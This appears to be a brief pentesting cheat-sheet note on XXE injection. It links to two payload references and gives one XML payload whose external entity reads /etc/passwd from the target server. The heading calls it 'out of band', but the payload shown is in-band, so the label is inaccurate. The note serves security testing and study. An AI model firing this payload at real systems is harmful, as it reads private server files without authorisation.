# XXE xml external entity
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

## exfiltrate file out of band payload
PayloadsAllTheThings
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
